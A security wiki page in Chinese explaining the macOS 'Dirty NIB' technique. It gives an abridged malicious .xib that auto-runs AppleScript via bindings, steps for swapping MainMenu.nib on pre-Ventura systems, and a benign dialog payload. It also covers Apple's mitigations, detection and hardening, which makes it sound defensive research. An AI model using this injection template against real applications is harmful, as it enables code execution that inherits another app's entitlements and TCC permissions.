# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB 是指滥用已签名 macOS app bundle 中的 Interface Builder 文件（.xib/.nib），在目标进程内部执行攻击者控制的逻辑，从而继承该进程的 entitlements 和 TCC permissions。该技术最初由 xpn（MDSec）记录，之后由 Sector7 进行概括并大幅扩展；Sector7 还介绍了 Apple 在 macOS 13 Ventura 和 macOS 14 Sonoma 中采取的缓解措施。<sup>[[1]](#references)[[2]](#references)</sup> 如需了解背景和深入分析，请参阅文末的 references。

> TL;DR
> • 在 macOS 13 Ventura 之前：替换 bundle 的 MainMenu.nib（或其他在启动时加载的 nib）通常可以可靠地实现 process injection，并且经常能够实现 privilege escalation。
> • 自 macOS 13（Ventura）起，并在 macOS 14（Sonoma）中得到加强：首次启动时的深度验证、bundle protection、Launch Constraints 以及新的 TCC “App Management” permission，基本上阻止了无关 app 在启动后篡改 nib。某些特殊情况下攻击仍可能可行（例如，同一 developer 的 tooling 修改自有 app，或用户授予 terminal App Management/Full Disk Access）。

## 什么是 NIB/XIB 文件

Nib（NeXT Interface Builder 的缩写）文件是 AppKit app 使用的序列化 UI 对象图。现代 Xcode 会存储可编辑的 XML .xib 文件，并在 build 时将其编译为 .nib。典型的 app 通过 `NSApplicationMain()` 加载其主 UI；该函数从 app 的 Info.plist 中读取 `NSMainNibFile` key，并在运行时实例化对象图。

能够实现该攻击的关键点：
- NIB loading 可以实例化任意 Objective-C classes，不要求这些 classes 遵循 NSSecureCoding（当 `initWithCoder:` 不可用时，Apple 的 nib loader 会回退到 `init`/`initWithFrame:`）。
- Cocoa Bindings 可被滥用于在 nib 实例化时调用 methods，包括无需用户交互的 chained calls。


## Dirty NIB injection process（攻击者视角）

经典的 Ventura 之前流程：
1) 创建恶意 .xib
- 添加一个 `NSAppleScript` object（或其他 “gadget” classes，例如 `NSTask`）。
- 添加一个 `NSTextField`，其 title 包含 payload（例如 AppleScript 或 command arguments）。
- 添加一个或多个 `NSMenuItem` objects，通过 bindings 连接到 target object 上的 methods。

2) 无需用户点击即可自动触发
- 使用 bindings 设置 menu item 的 target/selector，然后调用 private `_corePerformAction` method，使 action 在 nib 加载时自动触发。这样就不需要用户点击 button。

.xib 中 auto-trigger chain 的最小示例（为清晰起见进行了删节）：
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
这可以在目标进程加载 nib 时实现任意 AppleScript 执行。<sup>[[1]](#references)</sup> 高级利用链可以：
- 实例化任意 AppKit 类（例如 `NSTask`），并调用零参数方法，如 `-launch`。
- 通过上面的 binding 技巧，使用对象参数调用任意 selector。
- 加载 AppleScriptObjC.framework，以桥接到 Objective-C，甚至调用选定的 C API。
- 在仍包含 Python.framework 的旧系统上，桥接到 Python，然后使用 `ctypes` 调用任意 C 函数（Sector7 的研究）。<sup>[[2]](#references)</sup>

3) 替换应用的 nib
- 将 target.app 复制到可写位置，用恶意 nib 替换例如 `Contents/Resources/MainMenu.nib`，然后运行 target.app。在 Ventura 之前，经过一次性 Gatekeeper 评估后，后续启动只会执行浅层签名检查，因此不会重新验证非可执行资源（如 .nib）。

用于可见测试的 AppleScript payload 示例：
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## 现代 macOS 保护机制（Ventura/Monterey/Sonoma/Sequoia）

Apple 引入了多项系统级缓解措施，大幅降低了 Dirty NIB 在现代 macOS 中的可行性：<sup>[[2]](#references)</sup>
- 首次启动深度验证和 bundle 保护（macOS 13 Ventura）
- 任何 app 首次运行时（无论是否 quarantined），深度签名检查都会覆盖所有 bundle 资源。此后，bundle 会受到保护：只有来自同一开发者的 app（或由该 app 明确允许的 app）才能修改其内容。其他 app 需要新的 TCC “App Management”权限，才能写入另一个 app 的 bundle。
- Launch Constraints（macOS 13 Ventura）
- System/Apple-bundled apps 无法被复制到其他位置并启动；这会阻止对 OS apps 采用“复制到 /tmp、patch、运行”的方式。
- macOS 14 Sonoma 中的改进
- Apple 强化了 App Management，并修复了已知的 bypass（例如 Sector7 指出的 CVE‑2023‑40450）。Python.framework 更早之前已被移除（macOS 12.3），导致部分 privilege-escalation chains 失效。
- Gatekeeper/Quarantine 变更
- 如需更广泛地了解影响此 technique 的 Gatekeeper、provenance 和 assessment 变更，请参阅下面引用的页面。

> 实际影响
> • 在 Ventura+ 中，通常无法修改第三方 app 的 .nib，除非你的 process 具有 App Management 权限，或由与目标 app 相同的 Team ID 签名（例如 developer tooling）。
> • 为 shells/terminals 授予 App Management 或 Full Disk Access，实际上会重新开放这一 attack surface，使任何能够在该 terminal 上下文中执行 code 的对象都可以利用它。


### 处理 Launch Constraints

从 Ventura 开始，Launch Constraints 会阻止许多 Apple apps 从非默认位置运行。如果你依赖的是 Ventura 之前的 workflow，例如将 Apple app 复制到临时目录、修改 `MainMenu.nib`，然后启动它，那么预计在 >= 13.0 上会失败。


## 枚举 targets 和 nibs（适用于 research / legacy systems）

- 定位 UI 由 nib 驱动的 apps：
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- 在 bundle 内查找候选 nib 资源：
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 深入验证代码签名（如果你篡改了资源却未重新签名，验证将失败）：
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注意：在现代 macOS 上，如果没有适当的授权，尝试写入其他应用的 bundle 时，还会受到 bundle protection/TCC 的阻止。


## Detection and DFIR tips

- 对 bundle resources 进行文件完整性监控
- 监控已安装应用中 `Contents/Resources/*.nib` 及其他非 executable resources 的 mtime/ctime 变化。
- Unified logs 和 process behavior
- 监控 GUI apps 中意外的 AppleScript 执行，以及加载 AppleScriptObjC 或 Python.framework 的 processes。例如：
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- 定期在关键 apps 上运行 `codesign --verify --deep`，确保 resources 保持完整。
- Privilege context
- 审计哪些用户或进程拥有 TCC“App Management”或 Full Disk Access 权限（尤其是 terminals 和 management agents）。从通用 shells 中移除这些权限，可以防止轻易重新启用 Dirty NIB 式篡改。


## Defensive hardening (developers and defenders)

- 优先使用 programmatic UI，或限制从 nibs 实例化的内容。避免在 nib graphs 中包含强大 classes（例如 `NSTask`），并避免使用会间接调用任意 objects 上 selectors 的 bindings。
- 采用带有 Library Validation 的 hardened runtime（现代 apps 已普遍采用）。虽然这本身无法阻止 nib injection，但可以阻止容易实现的 native code loading，并迫使攻击者使用仅限 scripting 的 payloads。
- 不要在通用工具中请求或依赖广泛的 App Management permissions。如果 MDM 需要 App Management，应将该 context 与用户驱动的 shells 隔离。
- 定期验证 app bundle 的完整性，并使 update mechanisms 能够自动修复 bundle resources。


## Related reading in HackTricks

详细了解会影响此技术的 Gatekeeper、quarantine 和 provenance changes：

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
